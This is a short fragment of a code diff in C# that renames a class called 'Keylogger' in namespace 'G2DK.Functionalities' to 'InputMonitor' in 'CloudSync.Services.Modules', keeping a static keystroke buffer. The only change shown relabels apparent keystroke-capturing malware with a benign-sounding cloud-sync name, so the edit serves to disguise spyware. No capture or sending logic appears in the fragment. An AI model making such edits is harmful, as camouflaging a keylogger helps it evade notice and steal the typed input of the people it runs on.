@@ -6,9 +6,9 @@ using System.Text;
 using System.Threading;
 using System.Windows.Forms;
 
-namespace G2DK.Functionalities
+namespace CloudSync.Services.Modules
 {
-    public class Keylogger
+    public class InputMonitor
     {
         private static StringBuilder keystrokes = new StringBuilder();
         private static readonly object keyLock = new object();
